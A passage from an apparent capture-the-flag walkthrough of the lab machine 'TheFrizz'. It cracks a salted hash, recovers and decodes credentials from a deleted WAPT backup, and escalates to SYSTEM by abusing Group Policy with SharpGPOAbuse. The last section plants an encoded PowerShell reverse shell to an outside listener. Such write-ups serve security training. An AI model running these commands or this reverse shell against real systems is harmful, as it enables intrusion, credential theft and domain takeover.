   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
  11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
  11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated

Please specify the hash-mode with -m [hash-mode].
...[snip]...
```

It is reading in `<hash>:<salt>`, but it needs to know how to combine those when hashing. I could just start trying these, as it will run `rockyou.txt` in less than 10 seconds on my machine. Still, it’s more interesting to see how to figure this out using the source.

Searching the repo for “passwordstrong” returns the answer:

[![image-20250307171726748](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250307171726748.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250307171726748.png)

`.` in PHP is used to concatenate strings. So it’s hashing `<salt><password>`, which is mode 1420 above.

#### Crack

Running in this mode cracks the hash in seconds:

```console
$ hashcat f.frizzle.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 1420
hashcat (v6.2.6) starting
...[snip]...
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
...[snip]...
```

### SMB

I’ll try these creds over `netexec`, but they fail just as above:

```console
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23'
SMB         10.10.11.60     445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.60     445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
```

With `-k`, it complains about the clock skew:

```console
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 KRB_AP_ERR_SKEW
```

I’ll update the time, and it works:

```console
oxdf@hacky$ sudo ntpdate frizzdc.frizz.htb
2025-08-20 22:57:11.461359 (+0000) +25417.188962 +/- 0.046781 frizzdc.frizz.htb 10.10.11.60 s1 no-leap
CLOCK: time stepped by 25417.188962
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
```

The box exposes the standard DC shares:

```console
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --shares
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
SMB         frizzdc.frizz.htb 445    frizzdc          [*] Enumerated shares
SMB         frizzdc.frizz.htb 445    frizzdc          Share           Permissions     Remark
SMB         frizzdc.frizz.htb 445    frizzdc          -----           -----------     ------
SMB         frizzdc.frizz.htb 445    frizzdc          ADMIN$                          Remote Admin
SMB         frizzdc.frizz.htb 445    frizzdc          C$                              Default share
SMB         frizzdc.frizz.htb 445    frizzdc          IPC$            READ            Remote IPC
SMB         frizzdc.frizz.htb 445    frizzdc          NETLOGON        READ            Logon server share
SMB         frizzdc.frizz.htb 445    frizzdc          SYSVOL          READ            Logon server share
```

### SSH

Trying to connect over SSH returns an error:

```console
oxdf@hacky$ sshpass -p 'Jenni_Luvs_Magic23' ssh f.frizzle@frizz.htb
f.frizzle@frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
oxdf@hacky$ sshpass -p 'Jenni_Luvs_Magic23' ssh f.frizzle@frizzdc.frizz.htb
f.frizzle@frizzdc.frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
```

I’ll use `netexec` (see [this tweet](https://x.com/0xdf_/status/1881292110697238543)) to generate the `krb5.conf` file:

```console
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
oxdf@hacky$ cat krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
        default_domain = frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
oxdf@hacky$ sudo cp krb5.conf /etc/krb5.conf
```

Now I can get a ticket as f.frizzle:

```console
oxdf@hacky$ kinit f.frizzle
Password for f.frizzle@FRIZZ.HTB:
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
03/08/2025 05:46:41  03/08/2025 15:46:41  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 03/09/2025 05:46:37
```

And connect over SSH with either the `-k` or the `-o GSSAPIAuthentication=yes` option to tell it to use Kerberos:

```console
oxdf@hacky$ ssh -k f.frizzle@frizzdc.frizz.htb
PowerShell 7.4.5
PS C:\Users\f.frizzle>
```

I lost a bunch of time with this `ssh` command failing because my `hosts` file was:

```plaintext
10.10.11.60 frizz.htb frizzdc.frizz.htb
```

And not:

```plaintext
10.10.11.60 frizzdc.frizz.htb frizz.htb
```

In this case, SSH failed:

```console
oxdf@hacky$ ssh -k f.frizzle@frizz.htb
f.frizzle@frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
```

If I added `-vvv` to the command, I’d see this error:

```console
...[snip]...
debug1: Next authentication method: gssapi-with-mic
debug1: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database
...[snip]...
```

With this shell, I can grab the user flag:

```console
PS C:\Users\f.frizzle\Desktop> type .\user.txt
9a42de6c************************
```

## Shell as m.schoolbus

### Enumeration

#### Home Directories

f.frizzle’s is able to list directories in `C:\Users`, but not access anything in any of them:

```console
PS C:\Users> tree . /f
Folder PATH listing
Volume serial number is 00000209 75A3:D410
C:\USERS
├───Administrator
├───f.frizzle
│   ├───Desktop
│   │       user.txt
│   │
│   ├───Documents
│   ├───Downloads
│   ├───Favorites
│   ├───Links
│   ├───Music
│   ├───Pictures
│   ├───Saved Games
│   └───Videos
├───M.SchoolBus
├───Public
├───v.frizzle
└───w.Webservice
```

Their home directory is empty apart from the flag. There are two other potentially interesting users, m.schoolbus and v.frizzle.

#### Filesystem Root

The root of the filesystem has an unusual file, but f.frizzle can’t access it:

```console
PS C:\> ls -force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-          10/29/2024  7:36 AM                $WinREAgent
d--hs           2/20/2025  2:51 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           2/26/2025  8:13 AM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           2/27/2025  9:38 AM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp

PS C:\> cat .\DumpStack.log.tmp
Get-Content: Access to the path 'C:\DumpStack.log.tmp' is denied.
```

I’m using `-force` to show hidden files and directories as well.

Otherwise, there isn’t too much unusual here. I’ve already looked at the web directory.

#### Installed Programs

I’ll check the `Program Files` and `Program Files (x86)` directories for installed programs. Neither have much of interest:

```console
PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           2/20/2025  2:50 PM                Common Files
d----            5/8/2021  1:15 AM                Internet Explorer
d----            5/8/2021  1:15 AM                ModifiableWindowsApps
d----           2/26/2025  8:13 AM                PackageManagement
d----          10/29/2024  7:15 AM                PowerShell
d----           2/20/2025  2:50 PM                VMware
d----           2/26/2025  8:18 AM                Windows Defender
d----          10/29/2024  7:45 AM                Windows Defender Advanced Threat Protection
d----            5/8/2021  2:34 AM                Windows NT
d----           2/26/2025  8:13 AM                WindowsPowerShell
PS C:\Program Files (x86)> ls

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----            5/8/2021  1:27 AM                Common Files
d----            5/8/2021  1:15 AM                Internet Explorer
d----            5/8/2021  1:27 AM                Microsoft.NET
d----            5/8/2021  2:33 AM                Windows Defender
d----            5/8/2021  2:34 AM                Windows NT
d----            5/8/2021  1:15 AM                WindowsPowerShell
```

### RecycleBin

#### Enumeration

User’s recycle bins are stored in `C:\$RECYCLE.BIN` by their SID. There’s one recycle bin on TheFrizz, and it’s a hidden directory:

```console
PS C:\> cd '$RECYCLE.BIN'
PS C:\$RECYCLE.BIN> ls
PS C:\$RECYCLE.BIN> ls -force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103
```

Note that without single quotes around `$RECYCLE.BIN` it will evaluate as an empty environment variable and `cd` will go to the user’s home directory.

There’s one file pair in this user’s bin:

```console
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```

Recycle Bins have two types of files. The ones that start with `$I` store metadata about the file. The `$R` file holds the original content.

#### Metadata

Diving into the metadata file isn’t necessary to solve TheFrizz, but it’s interesting. While the metadata file has the extension of the original file, it is not that format. The structure of the `$I` file for Windows 10 and later is:

| Offset | Size | Data | Description |
|---|---|---|---|
| 0 | 8 |  | Header |
| 8 | 8 | Little-Endian Int | File Size |
| 16 | 8 | Windows FILETIME | Deletion Timestamp |
| 24 | 4 | Little-Endian Int | File Name Length |
| 28 | variable | UTF-16 String | File Name |

A hex dump in PowerShell shows this:

```console
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> format-hex '.\$IE2XMEG.7z'

   Label: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z

          Offset Bytes                                           Ascii
                 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
          ------ ----------------------------------------------- -----
0000000000000000 02 00 00 00 00 00 00 00 5B 20 D0 01 00 00 00 00 �       [ Ð�
0000000000000010 00 16 97 32 0F 2A DB 01 3C 00 00 00 43 00 3A 00  ��2�*Û�<   C :
0000000000000020 5C 00 55 00 73 00 65 00 72 00 73 00 5C 00 66 00 \ U s e r s \ f
0000000000000030 2E 00 66 00 72 00 69 00 7A 00 7A 00 6C 00 65 00 . f r i z z l e
0000000000000040 5C 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 \ A p p D a t a
0000000000000050 5C 00 4C 00 6F 00 63 00 61 00 6C 00 5C 00 54 00 \ L o c a l \ T
0000000000000060 65 00 6D 00 70 00 5C 00 77 00 61 00 70 00 74 00 e m p \ w a p t
0000000000000070 2D 00 62 00 61 00 63 00 6B 00 75 00 70 00 2D 00 - b a c k u p -
0000000000000080 73 00 75 00 6E 00 64 00 61 00 79 00 2E 00 37 00 s u n d a y . 7
0000000000000090 7A 00 00 00
```

I can load the file and parse it:

```console
PS C:\> $bytes = [System.IO.File]::ReadAllBytes('C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z')
PS C:\> [BitConverter]::ToInt64($bytes, 8)
30416987
PS C:\> [datetime]::FromFileTimeUtc([BitConverter]::ToInt64($bytes, 16))

Tuesday, October 29, 2024 2:31:09 PM
PS C:\> [BitConverter]::ToInt32($bytes, 24)
60
PS C:\> [System.Text.Encoding]::Unicode.GetString($bytes, 28, 120)
C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z
```

It’s using 120 bytes because the length of 60 UTF-16 characters is 120 raw bytes.

Alternatively, I can get this with PowerShell using a COM object to read from the recycle bin:

```console
PS C:\> $shell = New-Object -com shell.application
PS C:\> $rb = $shell.Namespace(10)
PS C:\> $rb.items()

Application  : System.__ComObject
Parent       : System.__ComObject
Name         : wapt-backup-sunday.7z
Path         : C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z
GetLink      :
GetFolder    :
IsLink       : False
IsFolder     : False
IsFileSystem : True
IsBrowsable  : False
ModifyDate   : 10/24/2024 8:16:29 PM
Size         : 30416987
Type         : 7Z File
```

#### Recover File

The size of the `$R` file matches exactly the size reported by the metadata:

```console
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```

I’m able to exfil this file using `scp`:

```console
oxdf@hacky$ scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
$RE2XMEG.7z                               100%   29MB 353.2KB/s   01:24
oxdf@hacky$ file wapt-backup-sunday.7z
wapt-backup-sunday.7z: 7-zip archive data, version 0.4
```

### WAPT

The files in the archive decompress into a `wapt` directory:

```console
oxdf@hacky$ 7z x wapt-backup-sunday.7z

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 30416987 bytes (30 MiB)

Extracting archive: wapt-backup-sunday.7z
--
Path = wapt-backup-sunday.7z
Type = 7z
Physical Size = 30416987
Headers Size = 65880
Method = ARM64 LZMA2:26 LZMA:20 BCJ2
Solid = +
Blocks = 3

Everything is Ok

Folders: 684
Files: 5384
Size:       141187501
Compressed: 30416987
oxdf@hacky$ ls wapt
auth_module_ad.py  db            licencing.py  setupdevhelpers.py       ssl                     waptconsole.exe.manifest  wapt-get.ini.tmpl  wapt.psproj           waptservice.exe       waptwua
cache              DLLs          log           setuphelpers_linux.py    templates               waptcrypto.py             wapt-get.py        waptpython.exe        wapt-signpackages.py  wgetwads32.exe
common.py          keyfinder.py  private       setuphelpers_macos.py    trusted_external_certs  wapt-enterprise.ico       waptguihelper.pyd  waptpythonw.exe       wapttftpserver        wgetwads64.exe
conf               keys          __pycache__   setuphelpers.py          unins000.msg            wapt-get.exe              waptlicences.pyd   wapt-scanpackages.py  wapttftpserver.exe
conf.d             languages     revision.txt  setuphelpers_unix.py     version-full            wapt-get.exe.manifest     waptmessage.exe    waptself.exe          wapttray.exe
COPYING.txt        lib           Scripts       setuphelpers_windows.py  waptbinaries.sha256     wapt-get.ini              waptpackage.py     waptserver.exe        waptutils.py
```

There’s a lot here. There are a couple databases in `wapt/db`, but neither with anything that seems interesting.

There are a bunch of certificates and keys, but none that are useful for anything. `wapt/conf/` has some of these, as well as `waptserver.ini`:

```console
oxdf@hacky$ ls wapt/conf
ca-192.168.120.158.crt  ca-192.168.120.158.pem  forward_ssl_auth.conf  require_ssl_auth.conf  uwsgi_params  waptserver.ini  waptserver.ini.template
```

The `.ini` file has configuration data:

```ini
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

The `secret_key` decodes to something with a lot of non-ASCII characters in it:

```console
oxdf@hacky$ echo "ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ" | base64 -d | xxd
00000000: ca53 d87e 7f6d 4d4f 480e ef72 b2c3 f696  .S.~.mMOH..r....
00000010: e2a1 8d08 a31c abed bb12 335f d696 84fc  ..........3_....
00000020: 982a d44e eed3 12ab 9b04 bab7 53c0 00c9  .*.N........S...
```

The `wapt_password` on the other hand gives a text password:

```console
oxdf@hacky$ echo IXN1QmNpZ0BNZWhUZWQhUgo= | base64 -d
!suBcig@MehTed!R
```

### SSH

I’ll try that password with the usernames I identified as the next targets above, m.schoolbus and v.frizzle. If they don’t work, I’ll make user list and spray it more broadly. But the first one I check works for SMB:

```console
oxdf@hacky$ netexec smb frizzdc.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\m.schoolbus:!suBcig@MehTed!R
oxdf@hacky$ netexec ssh frizzdc.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k
SSH         frizzdc.frizz.htb 22     frizzdc.frizz.htb [*] SSH-2.0-OpenSSH_for_Windows_8.1
```

It doesn’t work for SSH because `netexec` does not yet support Kerberos auth for SSH (there’s a [PR to add this](https://github.com/Pennyw0rth/NetExec/pull/817) currently being worked). I’m able to SSH in:

```console
oxdf@hacky$ kinit m.schoolbus
Password for m.schoolbus@FRIZZ.HTB:
oxdf@hacky$ ssh -k m.schoolbus@frizzdc.frizz.htb
PowerShell 7.4.5
PS C:\Users\M.SchoolBus>
```

## Shell as nt authority\system

### Enumeration

Looking at the m.schoolbus user, the thing that jumps out is membership in an interesting group:

```console
PS C:\> net user m.schoolbus
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/12/2025 12:45:31 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Desktop Admins
The command completed successfully.
```

This group is a member of the “Group Policy Creator Owners” group:

```console
PS C:\Users\M.SchoolBus> get-adgroup "Desktop Admins" -Properties memberOf | Select-Object -ExpandProperty memberOf
CN=Group Policy Creator Owners,CN=Users,DC=frizz,DC=htb
```

`whoami /groups` shows this as well:

```console
PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192
```

### GPO

#### Background

While “Group Policy Creator Owners” is not a default group, it strongly suggests that m.schoolbus is able to read and write Group Policy Objects.

[Group Policy Objects] (ihttps://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects)(GPOs) are collections of policy settings that apply to various computers, users, and groups across an Active Directory domain.

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is a project for attacking GPOs with capabilities to modify users, add local admins, set startup scripts, run commands, etc.

#### POC

There’s an already compiled copy of SharpGPOAbuse available from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpGPOAbuse.exe), which I’ll download to my VM, and then upload with `scp`:

```console
oxdf@hacky$ scp -k SharpGPOAbuse.exe m.schoolbus@frizz.htb:/windows/temp/
SharpGPOAbuse.exe                        100%   70KB 236.3KB/s   00:00
```

`SharpGPOAbuse.exe` requires a “vulnerable” (writable) GPO. There are two GPOs on the domain:

```console
PS C:\> Get-GPO -all

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:25:44 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :

DisplayName      : Default Domain Controllers Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:19:24 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :
```

Rather than mess with these, I’ll try to create my own:

```console
PS C:\> New-GPO -name "0xdf"

DisplayName      : 0xdf
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 551ab862-1897-42aa-a274-f95bdb262b3f
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 3/12/2025 1:02:20 AM
ModificationTime : 3/12/2025 1:02:20 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :
```

I’ll link it to this computer:

```console
PS C:\> New-GPLink -Name "0xdf" -target "DC=frizz,DC=htb"

GpoId       : 551ab862-1897-42aa-a274-f95bdb262b3f
DisplayName : 0xdf
Enabled     : True
Enforced    : False
Target      : DC=frizz,DC=htb
Order       : 2
```

I’ll use `SharpGPOAbuse.exe` to execute a command:

```console
PS C:\> \windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "0xdf" --Author "0xdf" --TaskName "RevShell" --Command "powershell.exe" --Arguments "whoami > \users\m.schoolbus\test"
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "0xdf" is: {84F481F5-7C75-49D2-8432-59648FD073FD}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{84F481F5-7C75-49D2-8432-59648FD073FD}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

This will run `whoami` and pipe the results into `C:\Users\m.schoolbus`. Just after running this, that file doesn’t exist:

```console
PS C:\> cat \users\m.schoolbus\test
Get-Content: Cannot find path 'C:\users\m.schoolbus\test' because it does not exist.
```

`gpupdate /force` will propagate the GPO:

```console
PS C:\> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

PS C:\> cat \users\m.schoolbus\test
nt authority\system
```

It worked!

#### Shell

It’s best to work off a clean GPO for another command (though there are methods to update). There’s a cleanup script running every couple minutes as well.

For simplicity, I’ll create a new one and link it:

```console
PS C:\> New-GPO -name "0xdf-rev"

DisplayName      : 0xdf-rev
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 45ea6a90-38e5-4770-a8f5-db032ea35ba5
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 3/12/2025 1:19:30 AM
ModificationTime : 3/12/2025 1:19:30 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :

PS C:\> New-GPLink -Name "0xdf-rev" -target "DC=frizz,DC=htb"

GpoId       : 45ea6a90-38e5-4770-a8f5-db032ea35ba5
DisplayName : 0xdf-rev
Enabled     : True
Enforced    : False
Target      : DC=frizz,DC=htb
Order       : 2
```

Now I’ll set the command as a PowerShell reverse shell and update it:

```console
PS C:\> \windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "0xdf-rev" --Author "0xdf" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "0xdf-rev" is: {45EA6A90-38E5-4770-A8F5-DB032EA35BA5}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{45EA6A90-38E5-4770-A8F5-DB032EA35BA5}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
PS C:\> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

When that completes, there’s a reverse shell at my listening `nc`:

```console
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.60 59805

PS C:\Windows\system32> whoami
nt authority\system
```

From here I can read the final flag:

```console
PS C:\users\administrator\desktop> type root.txt
65424e6c************************
```
